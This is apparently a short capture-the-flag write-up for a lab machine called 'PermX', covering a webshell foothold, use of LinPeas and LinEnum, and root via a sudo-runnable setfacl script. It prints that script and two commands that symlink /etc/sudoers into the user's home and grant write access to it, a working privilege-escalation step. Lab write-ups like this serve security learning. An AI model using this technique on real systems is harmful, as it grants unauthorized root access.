# PermX \[Easy]

Found the vhost this time, got the public exploit and landed on a webshell. Transfer LinPeas and LinEnum to see cheeky results, learn how to read this stuff

<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

User passwd for mtz, ssh w these credentials for user.txt

sudo -l shows us a acl.sh script which can be run

<figure><img src="../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

The last line mentions the command its trying to execute which is to change perms on any file in /home/mtz as long as root is not involved

```
ln -s /etc/sudoers helpfile
sudo /opt/acl.sh mtz rw /home/mtz/helpfile
```

We made a **symbolic link to sudoers list** and added our username to it and gave rw perms as shown in last ss for root.txt
